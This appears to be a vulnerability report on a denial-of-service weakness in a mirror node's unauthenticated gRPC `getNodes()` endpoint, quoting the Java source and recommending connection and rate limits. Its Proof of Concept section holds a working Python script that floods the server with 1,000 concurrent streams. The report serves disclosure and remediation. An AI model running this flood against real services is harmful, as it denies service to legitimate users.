### Title
Unbounded Connection Multiplexing on `getNodes()` Enables Resource Exhaustion DoS Against Gossip-Monitoring Clients

### Summary
The `getNodes()` gRPC endpoint in `NetworkController.java` requires no authentication and is subject to no per-client connection limit or global rate limit. An unprivileged attacker can open an arbitrary number of HTTP/2 connections to the server, each carrying up to `maxConcurrentCallsPerConnection` (default: 5) concurrent streaming `getNodes()` calls. Each call drives repeated paged DB queries via `Schedulers.boundedElastic()` with a 250 ms inter-page delay, exhausting the database connection pool and reactive scheduler capacity and preventing legitimate gossip-monitoring clients from establishing `subscribeTopic` streams.

### Finding Description

**Exact code path:**

`GrpcConfiguration.java` configures the Netty gRPC server with only one constraint:

```java
// grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java, lines 31-34
serverBuilder.executor(applicationTaskExecutor);
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

`NettyProperties.java` sets the default:

```java
// grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java, line 14
private int maxConcurrentCallsPerConnection = 5;
```

No `maxConnections`, no `maxConnectionAge`, no `keepAliveTimeout`, and no per-IP or global rate limit is configured. The gRPC module has no throttle infrastructure (throttling exists only in the `web3` module).

`NetworkController.getNodes()` subscribes immediately with no guard:

```java
// grpc/src/main/java/org/hiero/mirror/grpc/controller/NetworkController.java, lines 33-43
public void getNodes(final AddressBookQuery request, final StreamObserver<NodeAddress> responseObserver) {
    final var disposable = Mono.fromCallable(() -> toFilter(request))
            .flatMapMany(networkService::getNodes)
            ...
            .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);
    if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
        serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
    }
}
```

`NetworkServiceImpl.getNodes()` with `limit=0` (the default when the client omits the field) resolves to `Long.MAX_VALUE` items and pages indefinitely until the address book is exhausted, sleeping 250 ms between pages on `Schedulers.boundedElastic()`:

```java
// grpc/src/main/java/org/hiero/mirror/grpc/service/NetworkServiceImpl.java, lines 68-76
return Flux.defer(() -> page(context))
        .repeatWhen(RepeatSpec.create(c -> !context.isComplete(), Long.MAX_VALUE)
                .jitter(0.5)
                .withFixedDelay(addressBookProperties.getPageDelay())   // 250 ms
                .withScheduler(Schedulers.boundedElastic()))
        .take(filter.getLimit() > 0 ? filter.getLimit() : Long.MAX_VALUE)
```

Each `page()` call acquires a database connection via `transactionOperations.execute()`:

```java
// grpc/src/main/java/org/hiero/mirror/grpc/service/NetworkServiceImpl.java, lines 79-107
private Flux<AddressBookEntry> page(AddressBookContext context) {
    return transactionOperations.execute(t -> {
        ...
        var nodes = addressBookEntryRepository.findByConsensusTimestampAndNodeId(...);
```

Additionally, every `getNodes()` invocation eagerly loads the full `nodeStakeMap` into a new in-memory `Map<Long, Long>` before the Flux is even subscribed:

```java
// grpc/src/main/java/org/hiero/mirror/grpc/service/NetworkServiceImpl.java, lines 64-66
var nodeStakeMap = nodeStakeRepository.findAllStakeByConsensusTimestamp(nodeStakeTimestamp);
var context = new AddressBookContext(addressBookTimestamp, nodeStakeMap);
```

**Root cause:** The server enforces only a per-connection stream cap (5 streams/connection) but places no cap on the number of connections from a single client or in total. There is no rate limiter, no authentication, and no global concurrency ceiling for `getNodes()`.

**Why existing checks fail:**
- `maxConcurrentCallsPerConnection=5` is a per-connection limit. An attacker opening N connections gets 5N concurrent active streams.
- `setOnCancelHandler(disposable::dispose)` only cleans up on client-initiated cancel; it provides no server-side protection.
- The `AddressBookProperties.cacheSize=50` Caffeine cache caches pages, not full responses per-client, so N concurrent callers still each drive their own paged iteration and DB round-trips.

### Impact Explanation

With N attacker connections × 5 streams each:

1. **DB connection pool exhaustion**: Each active `page()` call holds a DB connection for the duration of the query. With a typical pool size of 10–20 connections, a few dozen concurrent `getNodes()` streams saturate the pool. Subsequent `subscribeTopic` calls from gossip-monitoring clients that need DB access queue indefinitely or fail.
2. **`boundedElastic` scheduler saturation**: Each stream occupies a `boundedElastic` thread during the 250 ms inter-page sleep. With enough streams the scheduler's thread cap is reached; new reactive subscriptions (including `subscribeTopic`) cannot be scheduled.
3. **Memory amplification**: Each call allocates a fresh `nodeStakeMap` copy. With hundreds of concurrent calls this multiplies heap pressure.

The net effect is that legitimate gossip-monitoring clients calling `subscribeTopic` are denied service — either their connection is accepted but their subscription never executes, or the server's accept queue fills and new TCP connections are refused.

Severity: **High** (unauthenticated, no-privilege, complete availability impact on the gRPC service).

### Likelihood Explanation

- No credentials or account required; the endpoint is fully public.
- A single attacker machine can open thousands of TCP connections and 5 streams each using any standard gRPC client library (e.g., `grpc-java`, `grpcurl` in a loop, or a custom Python/Go script).
- The attack is repeatable and sustainable: as each finite `getNodes()` stream completes (~750 ms for a 30-node address book at pageSize=10), the attacker immediately opens a replacement stream, maintaining constant saturation.
- No special network position or protocol knowledge beyond the publicly documented gRPC endpoint is needed.

### Recommendation

1. **Add a global connection limit** in `GrpcConfiguration.java`:
   ```java
   serverBuilder.maxConnectionAge(30, TimeUnit.SECONDS);
   serverBuilder.maxConnectionAgeGrace(5, TimeUnit.SECONDS);
   serverBuilder.maxConnectionIdle(10, TimeUnit.SECONDS);
   ```
   and consider `serverBuilder.maxInboundConcurrentCallsPerConnection(...)` combined with a global semaphore.

2. **Add a global concurrency cap for `getNodes()`** using a `Semaphore` or Reactor's `flatMap(maxConcurrency)` at the service layer, rejecting with `RESOURCE_EXHAUSTED` when the cap is exceeded.

3. **Add per-IP rate limiting** via a gRPC `ServerInterceptor` (analogous to the `ThrottleConfiguration` already present in the `web3` module) that tracks active `getNodes()` streams per remote address and rejects excess calls with `RESOURCE_EXHAUSTED`.

4. **Extend `NettyProperties`** to expose `maxConnections` and wire it into `GrpcConfiguration` alongside `maxConcurrentCallsPerConnection`.

### Proof of Concept

```python
import grpc
import threading
from concurrent.futures import ThreadPoolExecutor

# proto-generated stubs assumed available
from com.hedera.mirror.api.proto import network_service_pb2_grpc, network_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-grpc-host:5600"
CONNECTIONS = 200   # 200 connections × 5 streams = 1000 concurrent getNodes calls

def flood_connection(_):
    channel = grpc.insecure_channel(TARGET)
    stub = network_service_pb2_grpc.NetworkServiceStub(channel)
    query = network_service_pb2.AddressBookQuery(
        file_id=basic_types_pb2.FileID(fileNum=102),
        limit=0   # stream all entries, no early termination
    )
    streams = []
    for _ in range(5):   # max per-connection streams
        it = stub.getNodes(query)
        streams.append(it)
    # Hold streams open by consuming slowly
    for s in streams:
        for _ in s:
            pass

with ThreadPoolExecutor(max_workers=CONNECTIONS) as pool:
    list(pool.map(flood_connection, range(CONNECTIONS)))
```

**Expected result:** After ~50–100 connections the mirror node's DB connection pool is exhausted. A legitimate gossip-monitoring client attempting `subscribeTopic` receives `UNAVAILABLE` or hangs indefinitely waiting for a DB connection, confirming denial of service. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L11-15)
```java
public class NettyProperties {

    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/NetworkController.java (L33-43)
```java
    public void getNodes(final AddressBookQuery request, final StreamObserver<NodeAddress> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(networkService::getNodes)
                .map(this::toNodeAddress)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/NetworkServiceImpl.java (L61-76)
```java
        long addressBookTimestamp = addressBookRepository
                .findLatestTimestamp(fileId.getId())
                .orElseThrow(() -> new EntityNotFoundException(fileId));
        long nodeStakeTimestamp = nodeStakeRepository.findLatestTimestamp().orElse(NODE_STAKE_EMPTY_TABLE_TIMESTAMP);
        var nodeStakeMap = nodeStakeRepository.findAllStakeByConsensusTimestamp(nodeStakeTimestamp);
        var context = new AddressBookContext(addressBookTimestamp, nodeStakeMap);

        return Flux.defer(() -> page(context))
                .repeatWhen(RepeatSpec.create(c -> !context.isComplete(), Long.MAX_VALUE)
                        .jitter(0.5)
                        .withFixedDelay(addressBookProperties.getPageDelay())
                        .withScheduler(Schedulers.boundedElastic()))
                .take(filter.getLimit() > 0 ? filter.getLimit() : Long.MAX_VALUE)
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Querying for address book: {}", filter))
                .doOnComplete(() -> log.info("Retrieved {} nodes from the address book", context.getCount()));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/NetworkServiceImpl.java (L79-107)
```java
    private Flux<AddressBookEntry> page(AddressBookContext context) {
        return transactionOperations.execute(t -> {
            var addressBookTimestamp = context.getAddressBookTimestamp();
            var nodeStakeMap = context.getNodeStakeMap();
            var nextNodeId = context.getNextNodeId();
            var pageSize = addressBookProperties.getPageSize();
            var nodes = addressBookEntryRepository.findByConsensusTimestampAndNodeId(
                    addressBookTimestamp, nextNodeId, pageSize);
            var endpoints = new AtomicInteger(0);

            nodes.forEach(node -> {
                // Override node stake
                node.setStake(nodeStakeMap.getOrDefault(node.getNodeId(), 0L));
                // This hack ensures that the nested serviceEndpoints is loaded eagerly and voids lazy init exceptions
                endpoints.addAndGet(node.getServiceEndpoints().size());
            });

            if (nodes.size() < pageSize) {
                context.completed();
            }

            log.info(
                    "Retrieved {} address book entries and {} endpoints for timestamp {} and node ID {}",
                    nodes.size(),
                    endpoints,
                    addressBookTimestamp,
                    nextNodeId);
            return Flux.fromIterable(nodes);
        });
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/AddressBookProperties.java (L32-37)
```java
    @DurationMin(millis = 100L)
    @NotNull
    private Duration pageDelay = Duration.ofMillis(250L);

    @Min(1)
    private int pageSize = 10;
```
